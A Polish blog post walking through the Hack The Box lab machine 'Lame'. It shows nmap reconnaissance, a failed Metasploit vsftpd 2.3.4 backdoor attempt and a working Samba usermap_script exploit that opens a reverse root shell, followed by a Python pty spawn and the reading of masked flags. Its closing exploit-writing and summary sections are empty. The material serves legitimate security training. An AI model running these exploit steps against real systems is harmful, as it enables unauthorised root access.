---
layout: post
title:  "[HTB] Lame walkthrough"
tags: [htb, walktrough, pentesting]
---
* TOC
{:toc}
Pierwsze walktrough dość już starej maszynki o wdzięcznej nazwie "Lame" na platformie [Hack the box](https://www.hackthebox.eu/). Jeśli nie wiesz czym jest platforma HTB to spieszę z wyjaśnieniem. Platforma HTB to w dużym skrócie serwis, który umożliwia testowanie i rozwijanie umiejętności z zakresu pentestingu. Zabawa polega na zdobyciu dwóch flag: zwykłego użytkownika oraz roota (Administratora dla systemów Windows). Opis całej platformy to temat na oddzielny post. Zatem przejdźmy do "shackowania" naszej pierwszej maszynki.

# Rekonesans

W dalszej części postus przyjąłem, że posiadasz skonfigurowane połączenie VPN do platformy HTB. 

Zawsze pierwszym krokiem do zdobycia dostępu do maszyny jest rekonesans. Musimy sprawdzić jakie porty są otwarte oraz jakie usługi zostały wystawione. W tym celu użyjemy najpopularniejszego narzędzia do skanowania portów jakim jest nmap. Otwieramy konsole i wydajemy następujące polecenie:

```bash
sudo nmap -sVC 10.10.10.3
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-21 18:08 UTC
Stats: 0:00:18 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.88% done; ETC: 18:08 (0:00:00 remaining)
Nmap scan report for 10.10.10.3
Host is up (0.020s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.36
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -3d00h50m32s, deviation: 2h49m45s, median: -3d02h50m35s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2020-09-18T11:18:20-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: userhiw
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.54 seconds

```

Krótkie wyjaśnienie przełączników:
* **-sC** - skanowanie z domyślnym zestawem skryptów
* **-V** - pokaż wersję usług

Jak widzimy na powyższym zrzucie mamy kilka usług: ftp, ssh oraz sambę. SSH raczej możemy odrzucić, rzadko jest to punkt wejścia do maszyny, chyba, że innym sposobem (np. poprzez wykorzystanie dziury w aplikacji webowej) udało się zdobyć poświadczenia do logowania. Zostaje zatem ftp oraz samba. Szybkie wyszukanie w google frazy "vsftpd 2.3.4" prowadzi nas do strony (https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor). Według opisu tej podatności do archiwum vsftp został wprowadzony backdoor, który pozwala na wykonanie dowolnego polecenia na systemie z uprawnieniami usługi vsftpd. Czyli mamy podatność typu RCE (Remote Code Execution). Możemy zatem przejść do próby eksploitacji. 

# Eksploitacja vsftpd

Do pierwszej próby zdobycia dostępu do maszyny wykorzystamy narzędzie metasploit, które zawiera gotowy do wykorzystania eksploit. Uruchamiamy metasploita:

```bash
msfconsole
                                                  
 _                                                    _
/ \    /\         __                         _   __  /_/ __
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\


       =[ metasploit v5.0.88-dev                          ]
+ -- --=[ 2014 exploits - 1097 auxiliary - 343 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Enable verbose logging with set VERBOSE true

msf5 > 
```

Możemy przeszukać potężną bazę eksploitów i zobaczyć czy jest dostępny eksploit na tą konkretną wersję vsftpd:

```bash
msf5 > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
```
Ekspolit jest dostępny zatem możemy przejść do próby jego wykorzystania. Robimy to używając polecenia use i podając pełna ścieżkę do nazwy eksploita:

```bash
msf5 > use exploit/unix/ftp/vsftpd_234_backdoor
```

Możemy również wyświetlić informacje o danym eksploicie oraz parametry które musimy ustawić aby zadziałał:

```bash
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > info
       Name: VSFTPD v2.3.4 Backdoor Command Execution
     Module: exploit/unix/ftp/vsftpd_234_backdoor
   Platform: Unix
       Arch: cmd
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2011-07-03

Provided by:
  hdm <x@hdm.io>
  MC <mc@metasploit.com>

Available targets:
  Id  Name
  --  ----
  0   Automatic

Check supported:
  No

Basic options:
  Name    Current Setting  Required  Description
  ----    ---------------  --------  -----------
  RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
  RPORT   21               yes       The target port (TCP)

Payload information:
  Space: 2000
  Avoid: 0 characters

Description:
  This module exploits a malicious backdoor that was added to the 
  VSFTPD download archive. This backdoor was introduced into the 
  vsftpd-2.3.4.tar.gz archive between June 30th 2011 and July 1st 2011 
  according to the most recent information available. This backdoor 
  was removed on July 3rd 2011.

References:
  OSVDB (73573)
  http://pastebin.com/AetT9sS5
  http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
```
Jak widać jedynym potrzebnym parametrem jest parametr RHOSTS, który jest standardowy dla większości (wszystkich?) eksploitów czyli remote host. Tak więc ustawiamy go na adres IP maszyny Lame:

```bash
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
```

Jesteśmy gotowi do eksploitacji:

```bash
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > exploit 

[-] 10.10.14.36:21 - Exploit failed [unreachable]: Rex::ConnectionRefused The connection was refused by the remote host (10.10.14.36:21).
[*] Exploit completed, but no session was created.
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
```
Niestety widzimy informację o tym, że nie została utworzona żadna sesja. Oznacza to, że próba eksploitacji była nieudana. Prawdopodobnie wersja zainstalowana na serwerze nie jest już podatna na ten błąd ponieważ zgodnie z opisem został on dość szybko usunięty. Jeśli pamiętamy nasz pierwszy krok (rekonesans) to pamiętamy, że poza vsftp była jeszcze jedna usługa, która może zawierać jakąś podatność: samba.

# Eksploitacja samba

Do próby eksploitacji możemy również użyć narzędzia metasploit. Tym razem do sprawdzenia czy jest dostępny moduł użyjemy searchsploit, który moim zdaniem daje bardziej przejrzyste wyniki wyszukiwania:
```bash
searchsploit samba 3.0.20
---------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                          |  Path
---------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                                                  | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                        | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                                                                                   | linux/remote/7701.txt
Samba < 3.0.20 - Remote Heap Overflow                                                                                                   | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                                           | linux_x86/dos/36741.py
---------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Na powyższym zrzucie widzimy, że mamy kilka możliwości do wyboru, ale najciekawsza wydaje się być opcja "'Username' map script' Command Execution (Metasploit)". Spróbujmy:
```bash
msf5 exploit(multi/samba/usermap_script) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf5 exploit(multi/samba/usermap_script) > exploit

[*] Started reverse TCP double handler on 10.10.14.36:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo UomlPiNriGJ5FeAm;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "UomlPiNriGJ5FeAm\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (10.10.14.36:4444 -> 10.10.10.3:55173) at 2020-09-21 18:52:26 +0000

whoami
root
```
Bingo! Udało się, widzimy też, że od razu działamy jako użytkownik root więc dalsze podnoszenie uprawnień nie jest potrzebne. Możemy przejść do szukania flag.

# Szukamy flag

Flagi dla użytkowników zazwyczaj znajduja się w ich katalogu domowym (/home) a dla roota w /root. Najpierw jednak stwórzmy sobie pełnoprawną powłokłę, będzie łątwiej się poruszać po systemie. Jednym ze sposobów jest użycie do tego pythona, który zazwyczaj jest dosępny w każdym systemie Linux.

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
sh-3.2# whoami
whoami
root
sh-3.2# pwd
pwd
/
```

Poszukajmy zatem flag:

```bash
sh-3.2# ls -lah
ls -lah
total 97K
drwxr-xr-x  21 root root 4.0K May 20  2012 .
drwxr-xr-x  21 root root 4.0K May 20  2012 ..
drwxr-xr-x   2 root root 4.0K May 13  2012 bin
drwxr-xr-x   4 root root 1.0K May 13  2012 boot
lrwxrwxrwx   1 root root   11 Apr 28  2010 cdrom -> media/cdrom
drwxr-xr-x  13 root root  14K Sep 18 11:09 dev
drwxr-xr-x  95 root root 4.0K Sep 18 11:09 etc
drwxr-xr-x   6 root root 4.0K Mar 14  2017 home
drwxr-xr-x   2 root root 4.0K Mar 16  2010 initrd
lrwxrwxrwx   1 root root   32 Apr 28  2010 initrd.img -> boot/initrd.img-2.6.24-16-server
drwxr-xr-x  13 root root 4.0K May 13  2012 lib
drwx------   2 root root  16K Mar 16  2010 lost+found
drwxr-xr-x   4 root root 4.0K Mar 16  2010 media
drwxr-xr-x   3 root root 4.0K Apr 28  2010 mnt
-rw-------   1 root root  15K Sep 18 11:10 nohup.out
drwxr-xr-x   2 root root 4.0K Mar 16  2010 opt
dr-xr-xr-x 111 root root    0 Sep 18 11:09 proc
drwxr-xr-x  13 root root 4.0K Sep 18 11:10 root
drwxr-xr-x   2 root root 4.0K May 13  2012 sbin
drwxr-xr-x   2 root root 4.0K Mar 16  2010 srv
drwxr-xr-x  12 root root    0 Sep 18 11:09 sys
drwxrwxrwt   4 root root 4.0K Sep 18 12:02 tmp
drwxr-xr-x  12 root root 4.0K Apr 28  2010 usr
drwxr-xr-x  15 root root 4.0K May 20  2012 var
lrwxrwxrwx   1 root root   29 Apr 28  2010 vmlinuz -> boot/vmlinuz-2.6.24-16-server
sh-3.2# cd /home
cd /home
sh-3.2# ls
ls
ftp  makis  service  user
sh-3.2# cd makis
cd makis
sh-3.2# ls -lah
ls -lah
total 28K
drwxr-xr-x 2 makis makis 4.0K Mar 14  2017 .
drwxr-xr-x 6 root  root  4.0K Mar 14  2017 ..
-rw------- 1 makis makis 1.1K Mar 14  2017 .bash_history
-rw-r--r-- 1 makis makis  220 Mar 14  2017 .bash_logout
-rw-r--r-- 1 makis makis 2.9K Mar 14  2017 .bashrc
-rw-r--r-- 1 makis makis  586 Mar 14  2017 .profile
-rw-r--r-- 1 makis makis    0 Mar 14  2017 .sudo_as_admin_successful
-rw-r--r-- 1 makis makis   33 Mar 14  2017 user.txt
sh-3.2# cat user.txt
cat user.txt
***
sh-3.2# cd /root
cd /root
sh-3.2# ls
ls
Desktop  reset_logs.sh	root.txt  vnc.log
sh-3.2# cat root.txt
cat root.txt
***

```
# Eksploitacja wersja trudniejsza - piszemy prostego eksploita w Pythonie

# Podsumowanie
